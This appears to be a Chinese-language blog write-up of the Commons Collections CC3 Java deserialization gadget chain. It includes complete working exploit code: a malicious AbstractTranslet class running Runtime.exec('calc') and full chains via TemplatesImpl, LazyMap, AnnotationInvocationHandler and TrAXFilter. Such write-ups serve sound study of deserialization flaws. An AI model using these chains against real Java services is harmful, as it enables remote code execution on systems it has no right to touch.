---
title: Java反序列化-CC3链
date: 2026-03-13
category: Java
tags: ["web", "ctf", "Java反序列化"]
excerpt: 类加载?有点意思
---

# Java反序列化-CC3链

## 0x01 写在前面

CC3链与前面的CC1链与CC6链的区别之处是非常大的。CC1链和CC6链是通过`Runtime.exec()`进行**命令执行**。但毕竟是命令执行的危险方法，绝大多数时候服务器的代码当中的黑名单会选择禁用`Runtime`

而CC3链中，则不再依赖`Runtime`，而是通过动态加载类加载机制来实现自动执行**恶意类代码**

因此，你有必要先了解一下[Java类的动态加载](https://drun1baby.top/2022/06/03/Java反序列化基础篇-05-类的动态加载/)

## 0x02 TemplatesImpl 解析

**简单回顾**

利用 ClassLoader#defineClass 直接加载字节码，不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC31.PNG)

- `loadClass()` 的作用是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前ClassLoader的`findClass()`方法；
- `findClass()` 根据URL指定的方式来加载类的字节码，其中会调用`defineClass()`；

```Java
protected Class<?> findClass(String name) throws ClassNotFoundException {
    throw new ClassNotFoundException(name);
}
```

- `defineClass` 的作用是处理前面传入的字节码，将其处理成真正的 Java 类

```Java
protected final Class<?> defineClass(String name, byte[] b, int off, int len)
    throws ClassFormatError
{
    return defineClass(name, b, off, len, null);
}
```

由此可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java

默认的 `ClassLoader#defineClass` 是一个 native 方法，逻辑在 JVM 的C语言代码中

`defineClass()`只进行类加载而不会进行执行类，执行需要先进行 `newInstance()` 的实例化

`defineClass()`作用域为`protected`，我们需要寻找`public`类方便调用，find Usages我们找到了`TemplatesImpl`类

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC32.PNG)

其中的`defineClass()`方法

```Java
Class defineClass(final byte[] b) {
    return defineClass(null, b, 0, b.length);
}
```

查看调用情况，其被`defineTransletClasses()`内部调用

```Java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

作用域为`private`，继续查看调用情况，发现有三处调用

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC33.PNG)

其中在`getTransletInstance()`，发现了实例化方法

` AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance()`这就是关键切入点，如果能走完这个函数那么就能动态执行代码

```Java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        translet.setAllowedProtocols(_accessExternalStylesheet);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }

        return translet;
    }
    catch (InstantiationException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (IllegalAccessException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

继续跟进`getTransletInstance()`，终于找到了public作用域方法

```Java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```

并且`TemplatesImpl`这个类继承Serializable接口，方便我们控制其属性

```Java
public final class TemplatesImpl implements Templates, Serializable{...}
```

## 0x03 TemplatesImpl 利用

在分析过程我们说到只要走过 `getTransletInstance()` 方法即可，因为这个方法内调用了 `newInstance()` 方法

```Java
TemplatesImpl templates = new TemplatesImpl();
templates.newTransformer();
```

这样就完成了`getTransletInstance()`的触发，但是我们在寻找这个方法时注意到是其实走完这条链有很多限制的，我们重新跟进`newTransformer()`就能发现

满足`_name`不能为空否则直接返回

满足`_class`为空才能进入`defineTransletClasses()`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC34.PNG)

跟进`defineTransletClasses()`

满足`_bytecodes`不为空，否则抛出异常

```
_tfactory`也需要赋值，否则无法调用`_tfactory()
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC35.PNG)

都是`TemplatesImpl`类的属性，直接通过反射修改

```Java
Class tc = TemplatesImpl.class;
```

1. 满足`_class`为空，来看看`TemplatesImpl`的构造函数并没有给`_class`赋值，不需要我们主动操作
2. 满足`_name`不能为空，类型为String

```Java
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "aaa");
```

1. 满足`_bytecodes`不为空，类型为byte[][]

来看看`_bytecodes`的作用，实际上时循环调用`_bytecodes`数组中每一组的字节码通过`loader.defineClass()`转为 Class 对象

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC36.PNG)

这一步在进行`loader.defineClass()`会触发类的静态初始化块，因此我们需要把恶意的字节码存入`_bytecodes`

```Java
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
byte[][] codes = {code};
bytecodesField.set(templates, codes);
```

同时编写恶意类，在类初始化时触发静态初始化块，编译后将生成的`.class文件`放到对应路径下

```Java
package org.example;
  
public class test {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
 } catch (IOException e){  
            e.printStackTrace();  
 }  
    }  
}
```

1. `_tfactory`

先看`_tfactory`的数据类型，关键字为`transient`，这就导致了这个变量在序列化之后无法被访问

```Java
private transient TransformerFactoryImpl _tfactory = null;
```

但是我们的要求比较低，只需要在其序列化之前使其不为`null`即可，在readObject()的最后一行中我们找到了初始化定义

```Java
private void  readObject(ObjectInputStream is)
  throws IOException, ClassNotFoundException
{
    SecurityManager security = System.getSecurityManager();
    if (security != null){
        String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);
        if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase("true"))) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);
            throw new UnsupportedOperationException(err.toString());
        }
    }

    // We have to read serialized fields first.
    ObjectInputStream.GetField gf = is.readFields();
    _name = (String)gf.get("_name", null);
    _bytecodes = (byte[][])gf.get("_bytecodes", null);
    _class = (Class[])gf.get("_class", null);
    _transletIndex = gf.get("_transletIndex", -1);

    _outputProperties = (Properties)gf.get("_outputProperties", null);
    _indentNumber = gf.get("_indentNumber", 0);

    if (is.readBoolean()) {
        _uriResolver = (URIResolver) is.readObject();
    }

    _tfactory = new TransformerFactoryImpl();
}
```

依旧反射调用/.

```Java
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
```

完整的exp如下

```Java
TemplatesImpl templates = new TemplatesImpl();

Class tc = TemplatesImpl.class;

Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "aaa");

Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
byte[][] codes = {code};
bytecodesField.set(templates, codes);

Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());

templates.newTransformer();
```

## 0x04 解决报错

尝试运行exp，抛出了空指针错误

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC37.PNG)

报错提示出现在`TemplatesImpl`的422行，我们在上面打上断点调试看看问题

首先_class[i]，成功获取_bytecodes[i]字节码，superClass获取其父类

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC38.PNG)

判断父类名是否为`ABSTRACT_TRANSLET`，因为我们没有继承`ABSTRACT_TRANSLET`因此进入到else代码块

可以看到`_auxClasses`旁有了报错`NullPointException`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC39.PNG)

接下来我们有两个选择，一是给`_auxClasses`赋值，二是满足`test.class`继承`ABSTRACT_TRANSLET`，我们选择后者

为什么，我们看到下面的if判断，我在上图的箭头所指，如果没有满足`test.class`的父类为`ABSTRACT_TRANSLET`，就不会进入if代码块`_transletIndex`的值仍然为-1，导致抛出异常

```Java
if (_transletIndex < 0) {
    ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
    throw new TransformerConfigurationException(err.toString());
}
```

并且`AbstractTranslet`是一个抽象类，我们需要实现其抽象方法，最终的`test.class`如下

```Java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class test1 extends AbstractTranslet {
    public test1() {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
```

命令执行成功

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC310.PNG)

## 0x05 CC1链的TemplatesImpl实现

前面的链子不变，只改变最后的命令执行方式，通过动态加载类实现

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC311.PNG)

```Java
TemplatesImpl templates = new TemplatesImpl();

        Class tc = TemplatesImpl.class;

        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaa");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://Task/test1.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

//        templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null, null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AIHConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        AIHConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(invocationHandler.getClass().getClassLoader(), new Class[]{Map.class}, invocationHandler);
        invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, proxy);

        serialize(invocationHandler);
        unserialize("ser.bin");
```

## 0x06 CC6链解析

因为只需要调用 `TemplatesImpl` 类的 `newTransformer()` 方法，便可以进行命令执行，所以我们去到 `newTransformer()` 方法下，find usages找到了`TrAXFilter`类

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC312.PNG)

进入`TrAXFilter`类，虽然没有继承`Serializable`接口，但是在它的构造方法中实现`newTransformer()`，构造函数的参数也方便控制，所以我们只要执行这个类的构造函数即可命令执行

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC313.PNG)

CC3 的作者没有调用 `InvokerTransformer`，而是调用了一个新的类 `InstantiateTransformer`。

`InstantiateTransformer` 这个类是用来初始化 `Transformer` 的，我们去找 `InstantiateTransformer` 类下的 `transform()`方法

```TypeScript
public Object transform(Object input) {
    try {
        if (input instanceof Class == false) {
            throw new FunctorException(
                "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                    + (input == null ? "null object" : input.getClass().getName()));
        }
        Constructor con = ((Class) input).getConstructor(iParamTypes);
        return con.newInstance(iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
    } catch (InstantiationException ex) {
        throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
    }
}
```

方法首先检查了`input`是否为`Class`类型，然后获取构造器`con`再进行`newInstance()`，这个方法完美符合我们的需求，用以下代码来测试一下

```Java
TemplatesImpl templates = new TemplatesImpl();

Class tc = TemplatesImpl.class;

Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "aaa");

Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("D://Task/test1.class"));
byte[][] codes = {code};
bytecodesField.set(templates, codes);

Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());

InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
instantiateTransformer.transform(TrAXFilter.class);
```

命令执行成功，最后还是利用`ChainedTransformer+ConstantTransformer()`控制`setValue()`传参构造最终exp

```Java
TemplatesImpl templates = new TemplatesImpl();

        Class tc = TemplatesImpl.class;

        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaa");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://Task/test1.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);

        templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AIHConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        AIHConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(invocationHandler.getClass().getClassLoader(), new Class[]{Map.class}, invocationHandler);
        invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, proxy);

        serialize(invocationHandler);
        unserialize("ser.bin");
```

## 0x07 小结

因为几个链子最后都能通过`TemplatesImpl`实现命令执行，就放在一起总结了

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC3/CC314.PNG)

参考

https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ https://drun1baby.github.io/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ https://www.bilibili.com/video/BV1Zf4y1F74K/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=52eba7627ed3e9842c78702b92c1bba9
